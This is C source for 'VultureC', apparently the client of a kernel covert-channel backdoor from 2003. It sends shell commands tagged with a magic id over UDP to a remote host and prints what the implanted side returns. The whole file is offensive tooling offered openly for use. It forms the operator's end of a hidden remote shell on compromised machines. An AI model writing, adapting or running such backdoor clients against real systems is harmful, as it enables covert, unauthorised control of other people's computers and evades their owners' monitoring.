/*
 *  VultureC - Kernel Covert Channel Client
 *
 *  Copyright (C) 2003 rd <rd@vnsecurity.net>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 *  Greets to THC & vnsecurity
 *
 */

#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <linux/types.h>

#include "vulture.h"

#define BUFFER_LEN 8192

struct vulturehdr vultureh;

void print_usage(void)
{
   fprintf(stdout,
	   "Usage: vulturec [-h] -m magic -p port host command\n"
	   "\n"
	   "  -m magic	Magic id\n"
	   "  -p port	UDP dest port (0-65535)\n"
	   "  -h	Print this help screen\n\n");
}

void vulture_client (FILE *fp, int sockfd, struct sockaddr *saddr, int slen)
{
      char cmd[MAX_DATA_LEN], buf[MAX_BUFFER_LEN];
      int len;

      vultureh.cmd = VULTURE_RUN;
    
      printf("\n# ");
      fflush(stdin);
      while(fgets(cmd, MAX_DATA_LEN - 1, fp) != NULL) {
	vultureh.len = strlen(cmd);
	cmd[--vultureh.len] = 0;
        memcpy(buf, &vultureh, sizeof(vultureh));
        strncpy(buf + sizeof(vultureh), cmd, vultureh.len);
	
//	printf("Sending command %s, len = %d\n", cmd, vultureh.len);

        sendto(sockfd, buf, sizeof(vultureh) + vultureh.len, 0, saddr, slen);

        for (;;) {
		char rbuf[MAX_BUFFER_LEN];
		struct vulture_buff vbuf;

		rbuf[0] = 0;

      		len = recvfrom(sockfd, rbuf, BUFFER_LEN, 0,
		 	(struct sockaddr *) NULL, 0);

      	  	if (len < 0) {
			perror("UDP recv error!\n");
	 		exit(-1);
      		}

      		rbuf[len] = 0;
      
		vbuf.vultureh = (struct vulturehdr *) rbuf;
      		vbuf.data = rbuf + sizeof(vultureh);

/*		printf("Result: len=%d data=%d magic=%d state=%u\nret=%s\n", len,
			len - sizeof(vultureh), ntohl(vbuf.vultureh->magic), 
			vbuf.vultureh->state, vbuf.data);

		printf("vbuf_data=%p vbuf_vulh=%p buf=%p\n", vbuf.data, vbuf.vultureh, buf);
		{
		int i;			
		for (i=0; i<len; i++)
			printf("%x ", rbuf[i]);
		printf("\n");
		}
*/
		printf("%s", vbuf.data);		
		if (vbuf.vultureh->state == VULTURE_SUCCESS) {
			printf("# ");
			fflush(stdin);
			break;
		}
       }
   }	
}

int main(int argc, char **argv)
{
   struct sockaddr_in saddr, caddr;
   char *host;
   int sockfd, c;
   int port = 1337;

   memset(&saddr, 0, sizeof(saddr));
   memset(&caddr, 0, sizeof(caddr));
   memset(&vultureh, 0, sizeof(vultureh));

   while ((c = getopt(argc, argv, "m:l:p:h")) != EOF) {
      switch (c) {
      case 'm':
	 vultureh.magic = htonl(atol(optarg));
	 break;
      case 'p':
	port = atoi(optarg);
	break;
      case 'h':
      default:
	 print_usage();
	 exit(EXIT_SUCCESS);
      }
   }

   if (optind < argc) {
      host = strdup(argv[optind++]);
   } else {
      print_usage();
      exit(EXIT_SUCCESS);
   }

   if (port <= 0 || port > 65535) {
	print_usage();
        exit(EXIT_SUCCESS);
   }
	
   printf("Remote host: %s, port: %d, magic: %u\n", 
	host, port, ntohl(vultureh.magic));

   saddr.sin_family = AF_INET;
   saddr.sin_port = htons(port);
   saddr.sin_addr.s_addr = inet_addr(host);
 
   if ((sockfd = socket(PF_INET, SOCK_DGRAM, 0)) < 0) {
	perror("couldn't open datagram socket\n");
   	exit(-1);
   }

   caddr.sin_family = AF_INET;
   caddr.sin_port = htons(0);
   caddr.sin_addr.s_addr = INADDR_ANY;

   if (bind(sockfd, (struct sockaddr *) &caddr, sizeof(caddr)) < 0) {
      perror("could not bind local address\n");
      exit(-1);
   }

   vulture_client(stdin, sockfd, (struct sockaddr *) &saddr, sizeof(saddr));

   close(sockfd);
   exit(0);
}
